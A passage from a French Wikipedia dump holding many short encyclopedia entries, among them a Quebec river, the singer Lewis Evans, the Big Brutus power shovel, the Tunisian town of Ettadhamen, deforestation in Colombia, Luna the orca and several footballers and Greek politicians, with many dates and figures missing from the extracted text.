À partir de sa source, la rivière coule sur vers le nord-ouest jusqu'à la confluence du ruisseau Georges-Lemaire ; sur vers le nord jusqu'à son embouchure.
La Petite rivière Noire se déverse sur la rive ouest de la rivière Saint-François dans une zone de rapides, en aval du "Le Trou-d'Abraham" et en amont des "Rapides au Bélier".
Toponymie.
Le toponyme Petite rivière Noire a été officiellement inscrit le à la Commission de toponymie du Québec.

</doc>
<doc id="9413068" url="https://fr.wikipedia.org/wiki?curid=9413068" title="Lewis Evans">
Lewis Evans

Lewis Evans, né le à Liverpool, est un chanteur britannique de pop/rock. Il est le chanteur du groupe The Lanskies depuis 2006. En 2015, il entame en parallèle une carrière solo.
Biographie.
Lewis Evans naît le à Oxford street à Liverpool. En 1997, ses parents déménagent en Normandie en s'installant près de Saint-Lô.
En 2006, il forme le groupe The Lanskies, il en devient le chanteur. 
En 2015, il enregistre son premier album solo au studio Tropicalia avec Tahiti Boy (David Sztanke) nommé "Halfway to Paradise" avec la participation de Gaëtan Roussel sur deux titres et une reprise de "Days of Pearly Spencer" en duo avec Keren Ann.
À partir de 2016, il commence sa collaboration avec Frédéric Buchet, qui devient son arrangeur.
La même année, il participe à L'E.P. "Jukebox Motel", concept original de B.O. d'un ouvrage écrit par Tom Graffin, et écrit trois titres interprétés en duo avec Juliette Armanet. Il s'attèle également à son deuxième album solo "Man in a bubble".
L'album suivant "Le rayon vert", est un EP, réalisé par Herman Dune. 
"L'ascension", son troisième album solo, sort en 2022. Sur scène, il est défendu avec un nouveau groupe entièrement acoustique et sans batterie, en décembre aux rencontres Trans Musicales de Rennes. 

</doc>
<doc id="9413070" url="https://fr.wikipedia.org/wiki?curid=9413070" title="Dannemora (New York)">
Dannemora (New York)

Dannemora est une municipalité ("town") américaine de l'État de New York, située dans le comté de Clinton. 
Géographie.
La municipalité s'étend sur dans le parc Adirondack, à l'ouest du comté de Clinton, près de la frontière canadienne.
Elle est traversée par la grande rivière Chazy, qui s'écoule vers le lac Champlain, sur le cours de laquelle est établi le lac Chazy. À l'ouest, se trouve le haut lac Châteaugay, où la rivière Châteauguay prend sa source.
Elle comprend le village de Dannemora, son siège administratif, ainsi que les localités de Chazy Lake et Lyon Mountain.
Histoire.
Vers 1838, les premiers habitants fondent la localité qui prend le nom du village suédois de Dannemora. La municipalité est créée en 1854 par détachement de la partie occidentale de celle de Beekmantown. 
L'établissement correctionnel de Clinton, fondé en 1845, est une prison réputée pour avoir été le lieu d'incarcération de Lucky Luciano.
Politique et administration.
La municipalité est administrée par un superviseur et un conseil de quatre membres élus pour deux ans.

</doc>
<doc id="9413072" url="https://fr.wikipedia.org/wiki?curid=9413072" title="SCOTERS">
SCOTERS



</doc>
<doc id="9413073" url="https://fr.wikipedia.org/wiki?curid=9413073" title="Sous le fil électrisé">
Sous le fil électrisé

Sous le fil électrisé est un livre de François Jaminet paru en 1921 à Bruxelles, puis en France en 1931 aux Nouvelles éditions latines, à Paris. Sa préface est d'Alix Pasquier (Alex Pasquier après 1924).
François Jaminet raconte l'histoire des filières de passage de la frontière néerlandaise qu'il avait organisées pendant la Première Guerre mondiale.
Deux fois condamné à mort par la justice militaire allemande, François Jaminet () fit sortir de Belgique plus de , dont de nombreux soldats français et belges.

</doc>
<doc id="9413080" url="https://fr.wikipedia.org/wiki?curid=9413080" title="Big Brutus">
Big Brutus

Big Brutus est le surnom d'une pelle de modèle Bucyrus-Erie 1850B électrique, qui était la deuxième plus grande de ce type — après "The Captain" () — en activité dans les années 1960 et 1970. Utilisée dans les opérations minières, la machine est conçue pour creuser le sol de 6 à avec une godet d'une contenance d'environ . La machine mesure de hauteur pour un poids d'environ . 
Elle est actuellement en exposition au musée de la mine de West Mineral dans le Kansas, après une donation de la Pittsburg &amp; Midway Coal Mining Company. En 1987, l'American Society of Mechanical Engineers a désigné "Big Brutus" comme "".

</doc>
<doc id="9413088" url="https://fr.wikipedia.org/wiki?curid=9413088" title="West Mineral">
West Mineral

West Mineral est une ville du comté de Cherokee au Kansas.

</doc>
<doc id="9413089" url="https://fr.wikipedia.org/wiki?curid=9413089" title="West Mineral (Kansas)">
West Mineral (Kansas)



</doc>
<doc id="9413092" url="https://fr.wikipedia.org/wiki?curid=9413092" title="NAM Bahia (G40)">
NAM Bahia (G40)



</doc>
<doc id="9413095" url="https://fr.wikipedia.org/wiki?curid=9413095" title="Adam Clendening">
Adam Clendening

&lt;dfn&gt;Adam Clendening&lt;/dfn&gt; (né le à Niagara Falls, dans l'État de New York aux États-Unis) est un joueur professionnel américain de hockey sur glace.
Biographie.
Carrière.
Adam Clendening commence en 2008 avec la United States National Development Team en USHL. Il rejoint en 2010 l'université de Boston en Hockey East. Il est repêché à la du repêchage d'entrée dans la LNH 2011 par les Blackhawks de Chicago. Il fait ses débuts professionnels en 2012 avec les IceHogs de Rockford en Ligue américaine de hockey. Adam Clendening joue son premier match dans la LNH le sous le maillot des Blackhawks de Chicago face aux Flames de Calgary. Lors de ce match, il inscrit son premier but en carrière sur son premier tir, face à Jonas Hiller.
Le , il est échangé aux Canucks de Vancouver en retour de Gustav Forsling.
Le , il est échangé aux Penguins de Pittsburgh en compagnie de Nick Bonino et d'un deuxième tour du repêchage 2016 en retour de Brandon Sutter et d'un troisième tour du repêchage 2016. Le , il a fait partie de l'échange aux Ducks d'Anaheim en compagnie de David Perron contre l'attaquant suédois Carl Hagelin. Le , les Ducks le soumettent au ballottage et il est réclamé par les Oilers d'Edmonton. Il n'a joué aucun match avec Anaheim.
Le , il est échangé aux Blackhawks de Chicago en compagnie d'Anthony Duclair en retour de Richard Panik et Laurent Dauphin .

</doc>
<doc id="9413098" url="https://fr.wikipedia.org/wiki?curid=9413098" title="Disco Fever">
Disco Fever



</doc>
<doc id="9413099" url="https://fr.wikipedia.org/wiki?curid=9413099" title="Ellenburg (New York)">
Ellenburg (New York)

Ellenburg est une municipalité ("town") américaine de l'État de New York, située dans le comté de Clinton.
Géographie.
La municipalité s'étend sur dans le nord-ouest du comté de Clinton, près de la frontière canadienne, et est limitrophe à l'ouest du comté de Franklin. Le sud s'étend sur le parc Adirondack.
Histoire.
La localité est nommée en l'honneur de la fille de John R. Murray, propriétaire terrien local.
La municipalité est créée en 1830 par détachement de la partie ouest de celle de Mooers, puis en 1845, la partie nord est à son tour séparée pour former la municipalité de Clinton.
Politique et administration.
La municipalité est administrée par un superviseur et un conseil de quatre membres élus pour deux ans.

</doc>
<doc id="9413100" url="https://fr.wikipedia.org/wiki?curid=9413100" title="Indirana salelkari">
Indirana salelkari

Indirana salelkari est une espèce d'amphibiens de la famille des Ranixalidae.
Répartition.
Cette espèce est endémique du Sud de l’État de Goa en Inde.
Description.
Les 4 spécimens adultes mâles observés lors de la description originale mesurent entre et de longueur standard et les 4 spécimens adultes femelles observés lors de la description originale mesurent entre et de longueur standard.
Étymologie.
Cette espèce est nommée en l'honneur de Prakash Salelkar.

</doc>
<doc id="9413101" url="https://fr.wikipedia.org/wiki?curid=9413101" title="Kelly Albanese">
Kelly Albanese

Kelly Albanese est une actrice américaine née le à Westport, Massachusetts, États-Unis.
Biographie.
Vie privée.
Kelly Albanese est mariée à Shawn Hatosy.

</doc>
<doc id="9413105" url="https://fr.wikipedia.org/wiki?curid=9413105" title="Discographie de Bill Evans">
Discographie de Bill Evans



</doc>
<doc id="9413119" url="https://fr.wikipedia.org/wiki?curid=9413119" title="Démographie de Gondreville">
Démographie de Gondreville



</doc>
<doc id="9413127" url="https://fr.wikipedia.org/wiki?curid=9413127" title="Gordon Astall">
Gordon Astall

Gordon Astall, né le à Horwich, dans le Lancashire et mort le , est un footballeur anglais, évoluant au poste d'ailier droit. Au cours de sa carrière dans les années 1950 et 1960, il est appelé en sélection de "Football League", en sélection nationale B puis deux fois en équipe d'Angleterre. Il compte en club 456 matchs de championnat.
Carrière.
Né près de Bolton à Horwich dans ce qui était alors encore le Lancashire, Astall n'est pas retenu après un essai aux Bolton Wanderers. Il commence une carrière de footballeur amateur à Southampton quand il est repéré et signe un premier contrat professionnel avec Plymouth Argyle en . Il fait ses débuts en championnat en et devient vite un titulaire régulier, contribuant à la victoire de Plymouth en "Third Division South" en 1952. Il est cette année-là sélectionné en équipe d'Angleterre B.
En il est transféré à Birmingham City, club rival en "Second Division", contre livres sterling. Il part sur un bilan de 188 matchs de championnat et 42 buts avec Plymouth. 
A Birmingham il remplace l’Écossais Jackie Stewart et s'impose comme titulaire. L'équipe remporte le titre de "Second Division" en 1955 et atteint la finale de la Coupe d'Angleterre de 1956, perdue 3-1 à Wembley face à Manchester City.
Quelques jours après, Astall fait ses débuts en équipe d'Angleterre. Il marque pour sa première sélection face à la Finlande le , et honore une deuxième cape six jours plus tard face à l'Allemagne. Ce sera sa dernière apparition internationale.
Astall prend part aux campagnes de Birmingham en Coupe des villes de foires, et dispute notamment la finale de 1960 perdue en deux matchs face au FC Barcelone. En , après 271 matchs et 67 buts avec Birmingham, il est libre de tout contrat et signe à Torquay United, en "Third Division".
Il y marque 10 buts en 27 matchs de championnat, qui s'achève sur la relégation de l'équipe. Il ne participe qu'à six matchs la saison suivante avant de prendre sa retraite sportive, à 34 ans.
Il reste dans la région de Torbay, travaille dans les assurances et devient entraîneur dans le club local d'Upton Vale FC

</doc>
<doc id="9413128" url="https://fr.wikipedia.org/wiki?curid=9413128" title="Démographie de Griselles">
Démographie de Griselles



</doc>
<doc id="9413131" url="https://fr.wikipedia.org/wiki?curid=9413131" title="Days of Pearly Spencer">
Days of Pearly Spencer

Days of Pearly Spencer est une chanson du chanteur nord-irlandais David McWilliams sortie en 1967.

</doc>
<doc id="9413133" url="https://fr.wikipedia.org/wiki?curid=9413133" title="Démographie de Guilly">
Démographie de Guilly



</doc>
<doc id="9413140" url="https://fr.wikipedia.org/wiki?curid=9413140" title="Etropole">
Etropole



</doc>
<doc id="9413144" url="https://fr.wikipedia.org/wiki?curid=9413144" title="Military brat">
Military brat

, , est une expression utilisée aux États-Unis pour désigner un enfant de militaire.
Ils sont associés à une sous-culture unique et une identité culturelle propre, puisqu'au cours de son enfance et de son adolescence, il est immergé dans la culture militaire au point où la culture dominante de son pays d'origine peut lui sembler étrangère ou périphérique. Même à l'intérieur des États-Unis, la famille de l'enfant se déplace typiquement sur de grandes distances entre États d'une affectation à l'autre pendant une grande partie de la jeunesse des enfants. Cette mobilité induit un mélange des identités culturelles en raison de l'exposition à de nombreuses cultures régionales. De plus, la famille subit les contraintes liées à la guerre, dont l'absence de longue durée d'un parent, ainsi que les questions de séquelles de guerre.
Ce terme est parfois considéré comme péjoratif.

</doc>
<doc id="9413147" url="https://fr.wikipedia.org/wiki?curid=9413147" title="Ettadhamen">
Ettadhamen

Ettadhamen est une municipalité du gouvernorat de l'Ariana rattachée à l'agglomération de Tunis. Elle est issue de la scission en 2016 de la municipalité d'Ettadhamen-Mnihla avec la création d'une municipalité distincte à Mnihla.
Cette cité populaire, dont le nom signifie , se crée dès les années 1950 avec l'arrivée de populations issues de la migration intérieure. Ancien quartier construit dans l'illégalité, il est ensuite intégré dans le schéma directeur de l'agglomération tunisoise.
Histoire.
Le quartier d'Ettadhamen se forme dans le sillage des vagues de migration intérieure (pauvres, petits agriculteurs et chômeurs) qui marquent la Tunisie au début des années 1950, sous la présidence d'Habib Bourguiba, lorsque des centaines de familles quittent leurs villages pauvres des gouvernorats du Nord-Ouest (Siliana, Béja, Jendouba et Le Kef) pour les faubourgs de la capitale. 
La jeunesse du quartier joue un rôle central dans la révolution de 2011 qui renverse le président Zine el-Abidine Ben Ali car elle aspire à changer ses conditions de vie difficiles, mais sans succès. Si les traces des principaux contributeurs au soulèvement populaire sont encore présentes sur les murs des maisons et des ruelles environnantes, les projets d'infrastructure restent en effet absents de la région dans les années qui suivent, ce qui contribue à la détérioration de la situation et à la propagation de la criminalité, avec du trafic de stupéfiants et un niveau élevé de frustration et de dénuement chez les jeunes, dont la plupart choisissent l'émigration clandestine. Des mouvements islamistes militants se développent par ailleurs et certaines cellules djihadistes émergent, notamment parmi la jeunesse.
Avant la scission d'Ettadhamen-Mnihla en deux municipalités distinctes (Ettadhamen et Mnihla) en 2016, l'ensemble est habité par près de personnes (2014).
Économie.
La transition politique de l'État tunisien après la révolution de 2011 contribue à l'état de stagnation économique, avec une augmentation du nombre de diplômés universitaires et une absence de stratégie globale offrant des solutions radicales pour réduire le taux de chômage. Celui-ci est estimé à plus de 60 %, tandis que le taux de pauvreté est de 70 %, car le revenu mensuel de milliers de familles ne dépasse pas 200 dinars, alors qu'il atteignait 27,88 % pour les diplômés supérieurs en 2014.
Culture.
Complexe des jeunes.
Ettadhamen est équipé d'un complexe multidisciplinaire dont la mission est de former les jeunes et de développer leurs talents dans un certain nombre de domaines, tels que la musique, le théâtre et la lecture. Il est inauguré par le président Béji Caïd Essebsi en 2018.
Festivals d'été.
Le quartier a son propre festival qui se tient annuellement de la fin juillet à la première semaine d'août. En 2019, la communauté locale célèbre la édition du festival qui est considéré comme l'un des quelques événements de divertissement disponibles. Le festival réunit des activités de tout type, mais surtout des concerts et parfois des pièces de théâtre.
Sport.
Selon une étude réalisée par un groupe de sociologues sur la jeunesse de Douar Hicher et Ettadhamen, 55 % des associations actives sont sportives, 18,5 % à but non lucratif, 10,3 % culturelles et 10,5 % religieuses. Cette étude dispose que seulement un jeune sur quatre connaît au moins une association active dans son quartier.
Les clubs sportifs effectuent leurs activités dans la salle couverte du 14-Janvier 2011 ou au stade municipal. La première, achevée en 2003 pour un coût de dinars tunisiens, accueille les compétitions de lutte, d'haltérophilie et de la boxe; le second est achevé en 1989 pour un investissement de dinars et rénové en 2008 pour un coût de dinars tunisiens.

</doc>
<doc id="9413148" url="https://fr.wikipedia.org/wiki?curid=9413148" title="Manu (dessin-animé)">
Manu (dessin-animé)



</doc>
<doc id="9413150" url="https://fr.wikipedia.org/wiki?curid=9413150" title="La Cornette (Bouillon)">
La Cornette (Bouillon)

La Cornette est un hameau de la ville belge de Bouillon situé dans la province de Luxembourg en Région wallonne.
Sis sur des hauteurs de la Semois (rive droite) dans l’Ardenne belge, à du centre-ville de Bouillon, il est traversé par le ruisseau des Aleines et par le ruisseau de Pont le prêtre qui se joint aux Aleines. Il était autrefois rattaché à l'ancienne commune de Bellevaux. Quelques maisons sont sur le territoire de Bertrix et une maison se trouve sur la commune de Paliseul.
Éléments d’histoire.
Au cours de , on y découvrit des mines de fer sur la montagne du Honsaure, au sud du moulin de la Cornette. Le minerai était très pauvre ; elles ne produisirent qu’un fer aigre et cassant, faute de castine ou minette inconnue dans le duché. Selon l’opinion commune, ces mines cessèrent d’être exploitées vers l’an 1725.
Au cours de l’été 1944, le village de La Cornette a abrité un camp secret de la Mission Marathon. Cette Mission visait à mettre des aviateurs alliés à l’abri dans des camps, plutôt que de tenter de les évacuer par les filières d’évasion classiques. Abattus en territoires occupés, ils allaient rester dans ces camps jusqu’à la Libération. Six camps ont ainsi été établis en Ardenne, dont un à La Cornette. Il se trouvait dans la forêt, sur les hauteurs du village, au lieu-dit Croc. Plusieurs dizaines d’aviateurs alliés y sont restés jusqu’au 8 septembre 1944, le jour de l’arrivée des troupes américaines. Le camp a été dirigé successivement par Germain Servais et Gaston Matthys. Plusieurs habitants de la région ont contribué à la sécurité et au ravitaillement du camp .
Patrimoine.
Le moulin de la Cornette est un ancien fournil du , en bord du ruisseau de Pont le Prêtre, qui est aujourd’hui aménagé en gîte de vacances.
La colline du Saut des sorcières (350 mètres) offre un splendide point de vue sur un des nombreux méandres de la Semois.
La croix des aviateurs est un monument érigé au nord du hameau (sur la N816) à la mémoire de six aviateurs de la "Royal Air Force" dont l’avion s’écrasa à La Cornette le .

</doc>
<doc id="9413158" url="https://fr.wikipedia.org/wiki?curid=9413158" title="Un sourire dans la tempête">
Un sourire dans la tempête

Un sourire dans la tempête est un film français réalisé par René Chanas, sorti en 1951.

</doc>
<doc id="9413160" url="https://fr.wikipedia.org/wiki?curid=9413160" title="Cristophe Nicolas Radziwiłł">
Cristophe Nicolas Radziwiłł

Krzysztof Mikołaj Radziwiłł dit La Foudre ( lituanien: Kristupas Mikalojus Radvila Perkūnas) armoiries Trąby, né en 1547 et mort le à Łosośna fut échanson de Lituanie (1569), hetman de Lituanie (1572), castellan de Trakai, vice-chancelier de Lituanie (1579), voïvode de Vilnius (1584), grand hetman de Lituanie (1589). Il fut également l'un des commandants les plus talentueux de la république des Deux Nations (Pologne-Lituanie) qui se distingua pendant les guerres contre la principauté de Moscou d'Ivan le Terrible et la Suède de Charles IX.
Biographie.
Fils de Krzysztof Radziwiłł dit le Rouge ( lituanien: Mikalojus Radvila Rudasis) et Katarzyna Tomicka, comme son père, il est un fervent calviniste, adepte de l'Église polonaise réformée et un farouche opposant à la Contre-Réforme. En 1588 il fonde un temple calviniste à Siemiatycze.
Il est le vainqueur de la . Il a été enterré dans l'église évangélique réformée à son fief de Kėdainiai.
Mariages et descendance.
Krzysztof Mikołaj Radziwiłł se marie quatre fois. Une première fois avec Katarzyna Sobek, puis avec qui lui donne son premier fils :
Il se marie ensuite avec , qui lui donne deux enfants :
Il se marie enfin avec Elizaveta Ostrogska

</doc>
<doc id="9413161" url="https://fr.wikipedia.org/wiki?curid=9413161" title="Directeur de course">
Directeur de course

Un directeur de course est, lors d'une course sportive assez longue, en particulier si elle a lieu hors stade, une personne responsable de son bon déroulement. Il peut si nécessaire interrompre ou modifier l'épreuve à la suite d'événements exceptionnels, par exemple météorologiques, notamment s'ils présentent un risque pour la sécurité des participants. Les responsabilités et le rôle du directeur de course peuvent varier en fonction des épreuves et du sport concernés.
Un poste commun à plusieurs sports.
On peut retrouver la fonction de directeur de courses dans plusieurs sports impliquant l'organisation de comme les sports mécaniques, le cyclisme et la course au large.

</doc>
<doc id="9413164" url="https://fr.wikipedia.org/wiki?curid=9413164" title="Deborah Kimmett">
Deborah Kimmett

Deborah Kimmett est une écrivaine et comédienne canadienne.
Originaire de Napanee, Ontario, elle était membre de The Second City's Toronto cast dans les années 1980, et a apparu comme une actrice de théâtre dans les productions Norm Foster's "Windfall", Lawrence Jeffery's "Precipice" et Don Ferguson's "Skin Deep". Elle a écrit après plusieurs rôles, dont "Broken Record", "Last Respects" et "Miracle Mother", et dans le e-woman shows inclus "Dorothy Lawton: Unplugged", "Overboard" and "North of Normal".

</doc>
<doc id="9413166" url="https://fr.wikipedia.org/wiki?curid=9413166" title="Tatsumi Kimishima">
Tatsumi Kimishima

, né le à Tokyo, est un banquier et chef d'entreprise japonais.
Après plusieurs années en tant que PDG de puis DRH de Nintendo, Tatsumi Kimishima devient président directeur-général de cette dernière le , à la suite du décès de Satoru Iwata. Il quitte ses fonctions le pour laisser sa place à Shuntaro Furukawa.
Biographie.
Formation.
Il est diplômé de droit à l’université Hitotsubashi.
Carrière.
Tatsumi Kimishima travaille dans la finance, à la banque Tokyo-Mitsubishi de 1973 à 2000.
En 2000, il rejoint The Pokémon Company, une coentreprise cofondée par Nintendo, comme directeur délégué avant d’entrer à la direction de Nintendo of America, en 2002. Il en est le président directeur général de 2006 à 2013.
De 2014 et 2015, il occupe le poste de directeur des ressources humaines de Nintendo, avant de devenir PDG le après le décès de Satoru Iwata le .
Le , à l'âge de 68 ans, il quitte ses fonctions pour prendre sa retraite. Il est remplacé par Shuntaro Furukawa.

</doc>
<doc id="9413172" url="https://fr.wikipedia.org/wiki?curid=9413172" title="Déforestation en Colombie">
Déforestation en Colombie

La déforestation en Colombie est l'ensemble des processus qui ont conduit à la régression de la forêt en Colombie, qui perd environ de forêt chaque année d'après l'Organisation des Nations unies.
Historique.
D'après un rapport de la FAO, la Colombie a un taux de déboisement parmi les 5 plus élevés du monde. En 1997, la culture de la marijuana représentait , l'opium , à comparer aux de plants de coca.
Sur les 15 millions d'hectares de forêt humide détruits dans le monde dans les années 1980, 4,5 % l'ont été en Colombie.
Les institutions colombiennes ont annoncé en 2013 leur intention de mesurer plus fréquemment l'avancée de la déforestation, à savoir deux fois par an au lieu d'une fois tous les cinq ans.
En 2016, d'après un rapport de l'Institut d'hydrologie, de météorologie et d'études environnementales (IDEAM), la Colombie a perdu de forêts, la déforestation ayant augmenté de 44 % sur un an. Ce serait ainsi 20,6 hectares de forêts qui tombent toutes les heures. Selon l'IDEAM, les principales causes de la déforestation sont les cultures illicites, l'élevage intensif, la mise en pâturage, les incendies, la construction d'infrastructures et l'extraction illicite de minerais.
Politique forestière en Colombie.
Il existe plusieurs politiques, institutions et instruments dans le pays visant à gérer les ressources forestières et réduire la déforestation. La politique forestière du pays est incorporée par le Conseil national de la politique économique et sociale Conpes 2834 1996 et . Ce document présente le Plan National d'Aménagement Forestier (PNDF) qui reprend une grande partie de ce qui est établi dans la politique forestière et intègre les initiatives de Caractère international du Forum intergouvernemental sur les forêts, la Convention sur Diversité biologique, la Convention-cadre sur les changements climatiques, la Convention sur Commerce international des espèces de faune et de flore menacées d'extinction (CITES) et Convention internationale sur les bois tropicaux (OIMT). Aussi la creation des 
Causes et conséquences.
Une des causes principales est l'extension de la culture du coca, dont il est cependant difficile de connaître avec précision l'évolution. En 2006, près d'un quart des nouvelles parcelles de culture de cocaïne ont été gagnées sur la forêt primaire. Les autres causes après l'expansion de l'agriculture toutes cultures confondues, qui représente 73 % de la déforestation, sont l'exploitation du bois et les incendies de forêt.
L'épuisement des sols liés à ces cultures incite à déboiser de nouvelles parcelles, ce qui en moyenne provoque une perte de par jour.

</doc>
<doc id="9413173" url="https://fr.wikipedia.org/wiki?curid=9413173" title="Luna (orque)">
Luna (orque)

Luna (né vers le près des îles San Juan et mort le , aussi connue sous le nom scientifique L98 et sous le nom amérindien Tsuxiit, est une orque mâle.
Biographie.
Après avoir été séparé de sa mère encore jeune, solitaire à partir de , Luna passe cinq ans dans la baie de Nootka, sur la côte ouest de l'île de Vancouver au Canada. Il est devenu une attraction touristique majeure. La situation de Luna était controversée alors que les politiciens, les Amérindiens, le groupe Sea-World et le peuple se disputaient sur la façon de traiter sa situation. Fallait-il le capturer ou le laisser approcher les gens dans la baie ? Luna a causé des dommages importants à certains navires et il s’est légèrement blessé dans des collisions avec des bateaux.
L’histoire commence dans la baie de Nootka, au large de la côte ouest du Canada, en 2001, lorsque le jeune cétacé a été séparé de sa famille, en effet ils se rassemblent pour la migration et la chasse. La baie de Nootka serpente vers l’intérieur des terres depuis le Pacifique jusqu’à l’une des anciennes villes forestières en amont de la rivière. On y observe souvent les orques lors de leurs expéditions de pêche au saumon.
Quand les orques sont retournés à Puget Sound sans Luna et son oncle, des scientifiques ont émis l’hypothèse que les baleines disparues pêchaient peut-être ensemble lorsque l’oncle est mort. Mais personne ne sait vraiment ce qu’il s’est passé. Luna n’avait que deux ans, ce qui est très jeune pour des animaux qui vivent régulièrement jusqu’à soixante ou soixante-dix ans et qui n’atteignent pas la maturité avant l’âge de vingt ans au moins. 
Heureusement pour lui, Luna avait au moins appris à chasser sa nourriture. 
Les orques sont des animaux sociaux qui ont besoin de la compagnie des autres. Luna a donc commencé à créer des liens avec les humains qui vont et viennent sur les bateaux dans la baie de Nootka.
Sa présence attire les touristes malgré les craintes que son comportement sociable puisse devenir un danger pour l'Homme. Après des années de débat, le ministère canadien Pêches et Océans Canada autorise en sa capture pour la placer en captivité. Cependant, cette décision est finalement contrecarrée sur le terrain par une intervention des Premières Nations locales Mowachaht-Muchalaht qui considèrent Luna comme la réincarnation d'un de leur ancien chef mort peu avant la naissance de l'orque.
L'orque est tuée accidentellement par le remorqueur "General Jackson" en 2006.
Postérité.
Son histoire est racontée dans le documentaire "The Whale" (2011) de Suzanne Chisholm et Michael Parfit, diffusé en français dans Thalassa : "Luna, l'orque qui aimait les hommes", ainsi que dans le film "Saving Luna" ou "Luna: Spirit of the Whale", 2007 ("Luna, une Orque pas Comme les Autres") de Don McBrearty avec Adam Beach, Graham Greene (II), Jason Priestley, Tantoo Cardinal.

</doc>
<doc id="9413184" url="https://fr.wikipedia.org/wiki?curid=9413184" title="Luminance visuelle">
Luminance visuelle



</doc>
<doc id="9413188" url="https://fr.wikipedia.org/wiki?curid=9413188" title="Liste des épisodes de La Pat' Patrouille">
Liste des épisodes de La Pat' Patrouille

Cet article présente la liste des épisodes de la série d'animation canadienne "."
Diffusion.
En France, la saison 7 est diffusée à partir du sur Tfou. La saison 8 débute le sur Tfou.
Tous les épisodes ont des différences de chronologie comme l'épisode 12a (l'avalanche) qui révèle le recrutement du 6ème membre de l'équipe, Ruben.

</doc>
<doc id="9413189" url="https://fr.wikipedia.org/wiki?curid=9413189" title="Chrístos Smías">
Chrístos Smías

Chrístos Smías (en grec ) est un homme politique grec.
Biographie.
Aux élections législatives grecques de janvier 2015, il est élu député au Parlement grec sur la liste de la SYRIZA dans la circonscription de Pella.

</doc>
<doc id="9413205" url="https://fr.wikipedia.org/wiki?curid=9413205" title="Theodóra Tzákri">
Theodóra Tzákri

Theodóra Tzákri (en grec ), née en 1970 à Pella en Grèce, est une femme politique grecque.
Biographie.
Aux élections législatives grecques de janvier 2015, elle est élue députée au Parlement grec sur la liste de la SYRIZA dans la circonscription de Pella.

</doc>
<doc id="9413207" url="https://fr.wikipedia.org/wiki?curid=9413207" title="Le Son des tambours sur la neige">
Le Son des tambours sur la neige

Le Son des tambours sur la neige et autres nouvelles d'ailleurs est un recueil de nouvelles de Jean Raspail paru en aux Éditions Robert Laffont.

</doc>
<doc id="9413209" url="https://fr.wikipedia.org/wiki?curid=9413209" title="Anya Monzikova">
Anya Monzikova

Anya Monzikova est une mannequin et actrice russo-américaine.

</doc>
<doc id="9413216" url="https://fr.wikipedia.org/wiki?curid=9413216" title="Ilías Kostopanayótou">
Ilías Kostopanayótou

Ilías Kostopanayótou, en , né le à Lidoriki et mort le à Athènes, est un homme politique grec.
Biographie.
Aux élections législatives grecques de janvier 2015, il est élu député au Parlement grec sur la liste de SYRIZA dans la circonscription de la Phocide.

</doc>
<doc id="9413217" url="https://fr.wikipedia.org/wiki?curid=9413217" title="Château de Crémel">
Château de Crémel



</doc>
<doc id="9413220" url="https://fr.wikipedia.org/wiki?curid=9413220" title="Brian Greenhoff">
Brian Greenhoff

Brian Greenhoff, né le à Barnsley et décédé le à Rochdale, est un footballeur anglais. Il évolue en Football League avec Manchester United, Leeds United et Rochdale. Il compte 18 sélections en équipe d'Angleterre.
Carrière en club.
Manchester United.
Greenhoff s'initie au football à l'école "Yorkshire Schoolboys". Repéré par Manchester United, il rejoint le club en août 1968 et y fait ses débuts en équipe première le 8 septembre 1973 face à Ipswich Town. Joueur polyvalent, il débute comme milieu de terrain avant de devenir un défenseur central réputé. Il remporte avec son club la Coupe d'Angleterre en 1977, alors qu'il forme avec Martin Buchan la charnière centrale. Greenhoff joue 271 matchs avec le club de Manchester entre 1973 et 1979, et marque 17 buts. Son frère Jimmy joue aussi pour le club
Greenhoff avait choisi de signer à Manchester United, le club de Tommy Taylor, autre natif de Barnsley, plutôt à Rotherham United, un club plus proche dirigé par Tommy Docherty. Finalement c'est Docherty, nommé manager de Manchester United en 1972, qui le fait débuter. Il est un titulaire important de la jeune équipe mise en place par Docherty. Malgré la relégation en fin de saison 1973-1974, il est nommé meilleur joueur de la saison par les supporteurs.
Utilisé généralement comme milieu de terrain du fait de ses aptitudes techniques mais plus à l'aise en défense centrale, Greenhoff évolue à peu près à tous les postes pour Manchester, y compris gardien de but en remplacement d'Alex Stepney, blessé lors d'un match face à Birmingham City. Après l'échec en finale de la Coupe d'Angleterre en 1976, où Greenhoff quitte le terrain en pleurs, ce dernier réalise probablement la meilleure saison de sa carrière en 1976-1977. Il réalise des performances remarquées, par exemple face à l'Ajax Amsterdam en Coupe UEFA, et devient titulaire en équipe d'Angleterre en défense centrale. Lors de finale de la Coupe d'Angleterre de 1977, remporté par les siens, il est l'homme du match.
Fin de carrière.
Greenhoff quitte Manchester pour Leeds United en 1979 contre une indemnité de livres sterling, un montant record pour le club mancunien. Son passage y est relativement décevant, du fait notamment d'un problème de poids récurrent. Quand Leeds est relégué en 1982, son contrat prend fin.
Il part alors en Afrique du Sud, où il joue pour Wits University, puis à Hong-Kong où il porte le maillot de pendant la saison 1982-1983. Enfin il joue pour le RoPs en Finlande, en 1983. Il rejoint en décembre 1983 son frère Jimmy à Rochdale, où il est nommé entraîneur-joueur. Les deux frères quittent le club en mars 1984, après le licenciement de Jimmy.
Équipe nationale.
Greenhoff compte 18 capes en équipe d'Angleterre, ainsi qu'une en sélection B et quatre en équipe des moins de 23 ans. Il fait ses débuts en sélection A le 8 mai 1976 au Ninian Park de Cardiff face au Pays de Galles. Il marque une fois. Il honore sa dernière sélection le 31 mai 1980 lors d'un match amical face à l'Australie à Sydney
Reconversion.
Retiré du monde professionnel, Greenhoff devient entraîneur de football à un niveau régional, et se consacre également à la pratique du cricket à un niveau semi-professionnel, à Norden. 
Après sa retraite sportive, Greenhoff est régulièrement invité par les médias, pour discuter de Manchester United notamment. En 2012, il publie une autobiographie.
Il meurt le 22 mai 2013 dans sa maison de Rochdale.

</doc>
<doc id="9413221" url="https://fr.wikipedia.org/wiki?curid=9413221" title="Apóstolos Karanastásis">
Apóstolos Karanastásis

Apóstolos Karanastásis (en grec ), né le à Lamía en Grèce, est un homme politique grec.
Biographie.
Aux élections législatives grecques de janvier 2015, il est élu député au Parlement grec sur la liste de la SYRIZA dans la circonscription de la Phthiotide.

</doc>
<doc id="9413226" url="https://fr.wikipedia.org/wiki?curid=9413226" title="HMS Africa">
HMS Africa

Huit navires de la Royal Navy ont porté ou auraient dû porter le nom de HMS "Africa", d'après le continent du même nom :

</doc>
<doc id="9413228" url="https://fr.wikipedia.org/wiki?curid=9413228" title="Vassílios Kyriakákis">
Vassílios Kyriakákis

Vassílios Kyriakákis (en grec ) est un homme politique grec.
Biographie.
